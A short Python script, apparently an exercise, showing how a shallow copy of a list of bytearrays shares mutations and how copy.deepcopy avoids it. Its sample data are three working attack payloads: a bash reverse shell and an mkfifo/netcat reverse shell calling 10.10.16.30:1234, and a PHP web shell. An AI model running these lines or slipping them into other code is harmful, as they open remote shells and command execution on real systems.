#Deep Copy Pitfall
# Show how shallow copying a list of bytearray payloads leads to unwanted mutation, 
# then correct it using copy.deepcopy.

import copy

bash_revShell = b"sh -i >& /dev/tcp/10.10.16.30/1234 0>&1"
php_webShell = b"<?php system($_GET['cmd']);?>"
mkfifo_revShell = b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.30 1234 >/tmp/f"

payloadList = []
payloadList.append(bytearray(bash_revShell))
payloadList.append(bytearray(php_webShell))
payloadList.append(bytearray(mkfifo_revShell))

print(payloadList)

shallowList = payloadList.copy()

print(shallowList)

shallowList[0].pop()
print("Mutations:")
print("Original: ", payloadList)
print("Shallow Copy list: ",shallowList)

# difference in first payload 0>&1 to 0>&

deepCopyList = copy.deepcopy(payloadList)

deepCopyList[0].append(ord('1'))

print("\n\nTime for Deep copy")
print("Deep Copy",deepCopyList)
print("Original",payloadList)

# since it's a deepcopy we have no references to the original list.